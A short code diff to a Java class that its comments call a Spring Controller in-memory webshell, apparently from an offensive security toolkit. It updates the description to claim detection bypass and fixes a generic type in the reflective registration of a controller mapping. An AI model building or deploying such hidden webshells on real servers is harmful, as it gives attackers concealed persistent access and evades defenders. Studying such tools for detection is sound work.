@@ -6,7 +6,7 @@ import java.lang.reflect.Method;
 import java.util.Map;
 
 /**
- * Spring Controller 型内存马版本
+ * Spring Controller 型内存马版本，全反射调用，支持 hide-mem-shell type 2 绕过检测
  *
  * @author su18
  */
@@ -122,7 +122,7 @@ public class SpringControllerMS {
 				// 实例化 RequestMethodsRequestCondition
 				Constructor constructor1 = requestMethodsRequestCondition.getDeclaredConstructor(java.util.Set.class);
 				constructor1.setAccessible(true);
-				Object condition = constructor1.newInstance(new java.util.HashSet<>());
+				Object condition = constructor1.newInstance(new java.util.HashSet<Object>());
 
 				// 实例化 RequestMappingInfo
 				Constructor constructor2 = requestMappingInfo.getDeclaredConstructor(requestConditionClass, requestMethodsRequestCondition, params, headers, consumes, produces, requestCondition);
